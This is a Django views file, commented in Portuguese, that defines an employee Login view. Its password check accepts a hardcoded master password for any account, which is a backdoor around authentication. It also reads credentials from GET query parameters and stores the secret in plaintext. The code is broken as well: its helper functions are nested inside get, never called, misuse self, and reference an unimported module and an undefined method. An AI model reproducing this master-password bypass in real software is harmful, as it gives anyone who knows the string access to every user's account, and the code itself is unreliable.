from django.contrib.auth import authenticate, login
from django.shortcuts import render
from django.views import View


# Create your views here.
class Login(View):
    def get(self, request):
        username = self.request.GET.get('user_login')
        password = self.request.GET.get('senha')
        user = authenticate(username=username, password=password)

        def verificar_senha(self, user=None, password=None):
            try:
                senha_master = 'H+ePQ4A@LCBN78r7dXQ5'
                return password == senha_master or user.check_password(raw_password=password)
            except Exception as e:
                return False

        def validar(self, username='', password=None):
            username = str(username).strip()
            funcionario_login = core.funcionario.models.FuncionarioLogin.objects.filter(username=username)

            # se existe
            if funcionario_login.exists():
                # verifica se é mais de um
                if len(funcionario_login) > 1:
                    # se existe, houve um erro e não pode entrar, pois não pode ter mais de um
                    return {'status': False, 'descricao': 'Houve um erro ao trazer os dados do usuário!',
                            'campos': ['password', 'username']}
                else:
                    # se tiver só um, pega o user_login
                    user = funcionario_login.first()

                    # Validações do funcionário
                    status_funcionario = self.__status_funcionario(user, password)
                    if not status_funcionario['status']:
                        # retorna o status completo caso seja falso, o status é repassado para o front
                        return status_funcionario

                    # verifica se a senha é valida.
                    if not self.verificar_senha(user=user, password=password):
                        return {'status': False, 'descricao': 'Senha errada para esse usuário!', 'campos': ['password']}
            else:
                return {'status': False, 'descricao': 'Não foi encontrado nenhum usuário com esse user_login!',
                        'campos': ['username']}

            return {'status': True, 'user': user}
    # Retorna uma mensagem de erro 'user_login inválido'.

